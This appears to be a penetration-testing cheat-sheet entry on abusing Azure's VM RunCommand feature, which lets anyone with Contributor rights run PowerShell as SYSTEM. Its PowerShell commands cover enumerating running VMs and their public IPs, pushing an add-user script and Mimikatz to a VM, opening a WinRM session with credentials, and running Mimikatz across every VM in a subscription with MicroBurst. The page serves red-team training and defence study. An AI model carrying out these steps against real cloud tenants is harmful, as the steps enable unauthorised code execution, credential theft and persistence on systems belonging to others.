# Azure Services - Virtual Machine

## RunCommand

> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as `NT Authority\System`

**Requirements**: `Microsoft.Compute/virtualMachines/runCommand/action`

* List available Virtual Machines
    ```powershell
    PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
    ResourceGroupName    Name       
    -----------------    ----       
    TESTRESOURCES        Remote-Test
    ```

* Get Public IP of VM by querying the network interface
    ```powershell
    PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
    PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
    PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>
    ```

* Execute Powershell script on the VM, like `adduser`
    ```ps1
    PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
    PS Azure C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
    ```

* Finally you should be able to connect via WinRM
    ```ps1
    $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
    $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
    Enter-PSSession $sess
    ```

Against the whole subscription using `MicroBurst.ps1`

```powershell
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```


## References

* [Running Powershell scripts on Azure VM - Karl Fosaaen - November 6, 2018](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)